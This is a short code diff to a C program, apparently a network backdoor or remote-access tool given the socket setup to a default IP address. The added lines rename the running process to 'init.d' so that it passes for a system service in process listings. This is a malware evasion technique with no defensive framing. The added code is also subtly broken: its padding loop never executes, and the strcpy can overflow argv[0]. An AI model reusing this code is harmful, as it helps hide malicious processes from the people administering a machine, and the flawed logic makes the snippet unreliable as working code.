@@ -25,6 +25,13 @@ int main(int argc, char *argv[])
 
     struct sockaddr_in sa;
 
+	//here we are going to change the name of the binary for PS (kind of hacky)
+	char *newName = "init.d";
+	strcpy(argv[0], newName);
+	for(int i = 6; i < strlen(argv[0]); i++)
+		argv[0][i] = 'A';
+
+
 	//here we will set up our default listen server information
     sa.sin_family = AF_INET;						//AF_INET = Address Family is IPv4
 	sa.sin_addr.s_addr = inet_addr(DEFIPADDR);		//convert our ip string to a host byte arrangement
